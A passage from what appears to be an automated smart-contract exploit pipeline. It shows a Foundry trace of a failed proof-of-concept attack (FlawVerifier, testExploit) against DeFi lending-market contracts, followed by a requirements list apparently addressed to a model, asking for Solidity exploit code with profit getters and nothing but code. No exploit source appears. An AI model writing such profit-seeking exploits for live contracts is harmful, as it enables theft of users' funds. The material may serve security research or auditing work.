    │   │   │   │   ├─ [509] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─  emit topic 0: 0x2caecd17d02f56fa897705dcc740da2d237c373f70686f4e0d9bd3bf0400ea7a
    │   │   │   │   │        topic 1: 0x000000000000000000000000104079a87ce46fe2cf27b811f6b406b69f6872b3
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─  emit topic 0: 0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f
    │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x000000000000000000000000104079a87ce46fe2cf27b811f6b406b69f6872b3
    │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [994] 0x8e8C327AD3Fa97092cdAba70efCf82DaC3081fa1::41c728b9(000000000000000000000000104079a87ce46fe2cf27b811f6b406b69f6872b30000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   ├─ [381] 0xB814C49eBC3b407a764d8F449565Ce3F03907B91::41c728b9(000000000000000000000000104079a87ce46fe2cf27b811f6b406b69f6872b30000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Stop]
    │   ├─ [470] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::underlying() [staticcall]
    │   │   └─ ← [Return] 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [470] 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e::underlying() [staticcall]
    │   │   └─ ← [Return] 0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8
    │   ├─ [2550] 0x8e8C327AD3Fa97092cdAba70efCf82DaC3081fa1::getAllMarkets() [staticcall]
    │   │   ├─ [1822] 0xB814C49eBC3b407a764d8F449565Ce3F03907B91::getAllMarkets() [delegatecall]
    │   │   │   └─ ← [Return] [0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7, 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3, 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b, 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e]
    │   │   └─ ← [Return] [0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7, 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3, 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b, 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e]
    │   ├─ [470] 0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf4edfad26EE0D23B69CA93112eccE52704E0006f
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xf4edfad26EE0D23B69CA93112eccE52704E0006f) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [532] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::underlying() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [3070] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::underlying()
    │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   └─ ← [OutOfGas] EvmError: OutOfGas
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3.underlying
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.25s (1.07s CPU time)

Ran 1 test suite in 1.29s (1.25s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1056944165)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
